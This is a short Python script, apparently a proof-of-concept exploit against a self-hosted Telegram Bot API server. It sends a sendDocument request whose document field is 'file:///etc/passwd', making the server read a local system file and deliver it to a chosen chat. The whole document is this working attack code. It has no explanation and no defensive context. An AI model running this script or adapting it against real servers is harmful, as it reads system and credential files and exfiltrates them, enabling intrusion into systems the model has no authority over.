import requests
import sys

BOT_TOKEN = sys.argv[1].strip()
CHAT_ID = sys.argv[2].strip()
IP = sys.argv[3].strip()

FILE_PATH = "/etc/passwd"
LOCAL_BOT_API_URL = f"http://{IP}:8081"

url = f"{LOCAL_BOT_API_URL}/bot{BOT_TOKEN}/sendDocument"

data = {
    "chat_id": CHAT_ID,
    "document": f"file://{FILE_PATH}"
}
response = requests.post(url, json=data)
print(response.json())